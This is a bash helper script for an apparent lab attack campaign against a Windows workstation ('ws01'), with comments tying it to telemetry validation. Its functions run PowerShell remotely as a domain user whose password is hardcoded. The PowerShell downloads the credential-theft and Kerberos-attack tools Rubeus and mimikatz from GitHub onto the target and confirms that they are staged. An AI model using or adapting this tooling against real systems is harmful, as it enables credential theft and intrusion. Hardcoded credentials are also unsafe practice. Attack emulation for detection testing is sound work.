#!/usr/bin/env bash
# Shared helpers for Campaign A ws01-egress attacks (operator on provisioning .60)
set -euo pipefail

CAMPAIGN_A_LIB="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
export PATH="${HOME}/.local/bin:${PATH}"

cadre_export() {
  local case_id="$1" t_attack="$2" t0="$3"
  local src_ip="${4:-192.168.77.62}"
  echo "=== Export ${case_id} source=${src_ip} ==="
  # Telemetry export to Elastic is deferred to Plan 1 phase 2 (elk/monitor VMs).
  # During attack-only validation we log the export parameters and continue.
  if [[ -x "${HOME}/cadre-es-export.sh" ]]; then
    echo "INFO: skipping ES export — attack-only stage"
  fi
  echo "EXPORT_LOG: case=${case_id} attack=${t_attack} t0=${t0} source=${src_ip}"
}

ws01_exec_as() {
  local user="$1" pass="$2" cmd="$3"
  WS01_AD_USER="${user}" WS01_AD_PASS="${pass}" \
    bash "${CAMPAIGN_A_LIB}/ws01-exec.sh" "${cmd}"
}

ws01_ensure_rubeus() {
  ws01_exec_as analyst_t1 'T13r_An@lyst!' \
    'if (-not (Test-Path C:\Tools\cadre-attack)) { New-Item -ItemType Directory -Force -Path C:\Tools\cadre-attack | Out-Null }; if (-not (Test-Path C:\Tools\cadre-attack\Rubeus.exe)) { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" -OutFile C:\Tools\cadre-attack\Rubeus.exe -UseBasicParsing }; if (Test-Path C:\Tools\cadre-attack\Rubeus.exe) { Write-Output OK:Rubeus } else { Write-Output FAIL:Rubeus; exit 1 }'
}

ws01_ensure_mimikatz() {
  ws01_exec_as analyst_t1 'T13r_An@lyst!' \
    'if (-not (Test-Path C:\Tools\cadre-attack)) { New-Item -ItemType Directory -Force -Path C:\Tools\cadre-attack | Out-Null }; if (-not (Test-Path C:\Tools\cadre-attack\mimikatz.exe)) { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile C:\Tools\cadre-attack\mimikatz.zip -UseBasicParsing; Expand-Archive -Force C:\Tools\cadre-attack\mimikatz.zip C:\Tools\cadre-attack\mimikatz; Copy-Item C:\Tools\cadre-attack\mimikatz\x64\mimikatz.exe C:\Tools\cadre-attack\mimikatz.exe }; if (Test-Path C:\Tools\cadre-attack\mimikatz.exe) { Write-Output OK:mimikatz } else { Write-Output FAIL:mimikatz; exit 1 }'
}
